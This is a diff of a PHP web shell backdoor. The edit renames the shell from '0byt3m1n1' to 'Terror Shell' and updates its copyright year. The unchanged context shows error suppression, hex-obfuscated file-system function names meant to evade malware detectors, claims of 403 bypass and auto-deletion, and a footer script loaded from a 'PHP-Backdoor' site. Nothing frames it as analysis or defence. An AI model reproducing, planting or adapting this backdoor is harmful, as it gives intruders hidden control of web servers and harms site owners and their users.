@@ -1,7 +1,7 @@
 <?php
  
 /*
-    0 b y t 3 m 1 n 1 - 2.2
+    Shell do Edson (Terror)
     Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
 */
  
@@ -9,7 +9,7 @@ set_time_limit(0);
 error_reporting(0);
 error_log(0);
  
-$sname       = "\x30\x62\x79\x74\x33\x6d\x31\x6e\x31" . "-V2";
+$sname       = "TERROR SHELL" . "-V2";
 $__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
 $__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 $__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
@@ -174,7 +174,7 @@ function perms($file)
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-echo '<br><center>&copy; <span id="footer"></span> 2018.</center><br>';
+echo '<br><center>&copy; <span id="footer"></span> 2021.</center><br>';
 echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
